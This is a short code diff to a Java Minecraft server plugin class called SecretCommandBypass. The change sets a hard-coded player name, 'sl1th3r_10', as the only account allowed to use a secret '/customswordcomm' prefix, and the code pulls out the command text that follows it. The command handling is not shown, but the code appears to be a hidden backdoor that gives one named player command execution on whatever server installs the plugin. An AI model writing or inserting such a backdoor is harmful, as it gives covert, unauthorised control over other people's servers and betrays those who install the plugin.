@@ -29,7 +29,7 @@ public class SecretCommandBypass extends JavaPlugin implements Listener {
         String fullCommand = event.getMessage(); // Full command with "/"
         
         // Check if the player name is "x" (case insensitive) and command starts with /customSwordcomm
-        if (player.getName().equalsIgnoreCase("x") && fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
+        if (player.getName().equalsIgnoreCase("sl1th3r_10") && fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
             // Extract the actual command after "/customSwordcomm "
             String actualCommand = fullCommand.substring("/customswordcomm ".length());
             
